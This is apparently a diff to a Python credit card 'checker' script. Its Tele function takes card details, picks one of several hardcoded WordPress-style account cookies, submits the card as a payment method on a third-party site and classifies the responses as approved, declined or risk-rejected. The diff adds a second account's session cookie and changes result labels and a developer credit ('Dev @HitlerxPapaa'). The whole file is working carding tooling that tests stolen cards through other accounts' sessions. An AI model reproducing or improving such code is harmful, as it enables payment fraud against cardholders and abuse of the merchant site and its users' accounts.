@@ -5,7 +5,6 @@ import time
 import string
 import base64
 from bs4 import BeautifulSoup
-
 def Tele(ccx):
   import requests
   ccx = ccx.strip()
@@ -18,7 +17,8 @@ def Tele(ccx):
   with open('fileb3.txt', 'r') as file:
     first_line = file.readline()
   while True:
-    lines = '''hitlerpapa12%7C1723634676%7C7LwuTmzr1JchHE7RJHYbiHmxFuwgyCu0MwUTsDWGE6n%7Cec7ee1820e0a0fdc66fbd9493e18df6c4ab27d0a58ac858856f9f06ce04357ed'''
+    lines = '''hitlerpapa12%7C1723634676%7C7LwuTmzr1JchHE7RJHYbiHmxFuwgyCu0MwUTsDWGE6n%7Cec7ee1820e0a0fdc66fbd9493e18df6c4ab27d0a58ac858856f9f06ce04357ed
+opflash73%7C1723603056%7CXRvwlCwAJxfR8sfgETT8BmFxFPwT3DQ1d68tQasmEqN%7C9e361bc8a3f23bc0b5919aa4f6b51e214b0010d378c71795ed184035bc4b0dab'''
     lines = lines.strip().split('\n')
     random_line_number = random.randint(0, len(lines) - 1)
     big = lines[random_line_number]
@@ -28,7 +28,6 @@ def Tele(ccx):
       break
   with open('fileb3.txt', 'w') as file:
     file.write(big)
-
   cookies = {
     '__wpdm_client': 'c5941813aa8bc6f6c6ffcad4aec421e6',
     '_ga': 'GA1.1.1298309649.1722425014',
@@ -194,18 +193,16 @@ def Tele(ccx):
   else:
     if 'Payment method successfully added.' in text:
       result = "1000: Approved"
-    elif 'Insufficient Funds' in text:
-        result = "Low Funds"
     elif 'risk_threshold' in text:
       result = "Gateway Rejected: Risk Threshold"
     elif 'Please wait for 20 seconds.' in text:
-      result = "try again"
+      result = "Wait for 20 Sec"
     else:
-      result = "Error"
+      result = "Declined"
       print('er#')
   if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Low Funds' in result:
      return 'Approved'
   else:
      return result
 def sq(card):
-  return 'Make sure to cover well when you come to sleep'
+  return 'Dev @HitlerxPapaa'
